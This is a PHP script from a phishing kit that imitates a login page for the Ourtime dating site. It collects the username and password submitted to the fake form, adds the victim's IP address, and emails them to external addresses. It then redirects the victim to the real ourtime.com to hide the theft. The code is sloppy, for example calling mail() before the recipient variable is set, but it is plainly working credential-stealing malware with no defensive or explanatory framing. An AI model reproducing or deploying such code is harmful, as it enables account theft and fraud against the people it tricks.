<?php

$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y g:i a");
$message .= "Ourtime Result"."\n";
$message .= "User : ".$_POST['user']."\n";
$message .= "Password: " .$_POST['pass']."\n";
$message .= "IP: ".$ip."\n";
mail($recipient,$ip,$message);

$recipient = "jlinda232@gmail.com,talk.g@aol.com";
$subject = "Result!!!";
$headers = "From: ourtime <mofiz@banglamail.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "yahoo", $message);
if (mail($recipient,$ip,$message,$headers))

{
?>                    
	
		   <script language=javascript>
window.location='https://www.ourtime.com/';
</script>
<?

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>